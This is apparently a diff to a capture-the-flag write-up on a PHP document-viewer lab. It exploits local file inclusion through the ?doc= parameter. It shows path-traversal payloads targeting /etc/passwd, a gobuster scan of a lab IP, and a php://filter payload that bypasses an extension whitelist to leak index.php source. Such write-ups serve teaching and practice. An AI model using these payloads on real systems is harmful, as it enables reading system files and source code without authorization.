@@ -114,7 +114,7 @@ Request format: ?doc=<filename>
 Only .pdf and .png documents are served from this terminal. 
 ```
 
-- ?doc= is likely being processed by a server-side script (PHP is plausible because /index.php exists, but not proven).
+- ?doc= is likely being processed by a server-side script (PHP is plausible because /index.php exists).
 - The application performs some extension validation:
 - ../../../etc/passwd → 403, displaying "Only .pdf and .png documents are served from this terminal. "
 - ../../../etc/passwd.pdf → 202, nothing output (just allows and fails after filter).
@@ -133,10 +133,12 @@ else
 // 403
 }
 ```
+
 A check with gobuster confirms there is php used in this example.
 ```
 # gobuster dir -u http://10.64.130.163 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x html,php,txt
 ...
+
 Starting gobuster in directory enumeration mode
 ===============================================================
 /.html                (Status: 403) [Size: 278]
@@ -192,7 +194,7 @@ if ($doc !== '') {
 <title>VILLAGE ARCHIVE TERMINAL v2.3</title>
 ... The html component easily obtained with source viewer any browser
 ```
-Php code explains a lot, filters directory traversal, reads superficially for 3 letters in file name, sets directory path, begins download before it realises it can read the file that does not exist and fails.
+Php code explains a lot, filters directory traversal, reads superficially for 3 letters in file name, sets directory path, begins download before it realises it can read the file and fails (from error/permission or file type).
 
 **php://filter is a PHP stream wrapper.** Think of it as a special PHP "virtual file path" that tells PHP:
 
@@ -201,8 +203,6 @@ Php code explains a lot, filters directory traversal, reads superficially for 3 
 ```
 readfile("index.php");
 ```
-reads: index.php, this used after doc?
-
 Wrapper read:
 ```
 readfile("php://filter/convert.base64-encode/resource=index.php");
@@ -211,13 +211,24 @@ means:
 
 index.php
 ↓
-base64 encode
+convert.base64-encode filter
 ↓
-output encoded text
+output Base64 encoded data
 
-The middle section there is where a filter to convert file is applied here to resource file index.php. Can be dropped and pass resource to output as seen in index.php example above.
-
-Instead of getting the executed PHP page, the above example with this valid filter for base64 gives something like, interesting but not required:
+- Simply returns the raw source code of index.php.
+- The vulnerability exists because the application treats any value containing :// as a wrapper and skips the .pdf/.png whitelist:
+```
+$is_wrapper = (strpos($doc, '://') !== false);
+```
+As a result,
+```
+?doc=php://filter/resource=index.php
+```
+bypasses the extension validation and is passed directly to:
+```
+readfile($path);
+```
+This is just output where index.php is used above. Checked its similar but isset missing?
 ```
 PD9waHAKJGRvYyA9ICRfR0VUWydkb2MnXTsK...
 ```
